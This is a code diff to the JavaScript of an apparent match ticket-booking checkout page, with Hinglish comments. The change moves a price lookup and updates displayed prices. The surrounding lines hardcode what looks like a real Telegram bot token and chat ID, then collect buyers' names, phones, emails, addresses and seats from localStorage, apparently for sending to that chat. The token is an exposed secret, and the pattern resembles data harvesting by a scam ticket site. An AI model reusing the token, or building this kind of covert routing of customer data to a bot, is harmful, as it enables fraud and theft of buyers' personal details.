@@ -261,7 +261,15 @@
             const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
             const chatId = "6820660513";
             
-            // 🔥 1. Pichle pages ka data fetch karna 🔥
+            // 🔥 1. Pichle page (summary.html) se naya Tax wala data fetch karna 🔥
+            const finalPrice = localStorage.getItem('finalPrice') || localStorage.getItem('selectedTotalPrice') || "0";
+            
+            // 🔥 FIX: HTML page load hote hi screen par direct naya price update karo 🔥
+            const priceDisplays = document.querySelectorAll('.final_paid_price');
+            priceDisplays.forEach(el => {
+                el.innerText = '₹' + finalPrice;
+            });
+
             let matchTitle = "Not Selected";
             let matchDate = "";
             try {
@@ -272,12 +280,9 @@
                 }
             } catch(e) {}
 
-            const finalPrice = localStorage.getItem('finalPrice') || localStorage.getItem('selectedTotalPrice') || "0";
             const name = localStorage.getItem('customerName') || "Not Provided";
             const phone = localStorage.getItem('customerPhone') || "Not Provided";
             const email = localStorage.getItem('customerEmail') || "Not Provided";
-            
-            // Address ke alag-alag naam ho sakte hain local storage mein, isliye dono check kiye hain
             const address = localStorage.getItem('customerAddress') || localStorage.getItem('address') || "Not Provided";
             const seats = localStorage.getItem('selectedSeats') || "Not Provided";
             
